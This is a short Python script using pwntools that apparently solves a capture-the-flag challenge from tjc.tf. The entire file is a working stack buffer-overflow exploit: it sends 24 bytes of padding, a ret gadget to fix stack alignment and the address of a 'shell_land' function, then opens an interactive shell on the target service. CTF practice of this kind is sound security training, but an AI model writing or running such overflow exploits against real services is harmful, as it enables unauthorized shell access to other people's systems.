from pwn import *

local = True
r = remote('localhost',5000) if local else remote('tjc.tf', 31680)
f = ELF('./bin/chall')
gadget = 0x000000000040101a # check ROPemporium the MOVAPS issue

if __name__=='__main__':
	r.recvuntil(b'?')
	r.sendline(b'a'*24+p64(gadget)+p64(f.sym['shell_land']))
	r.interactive()

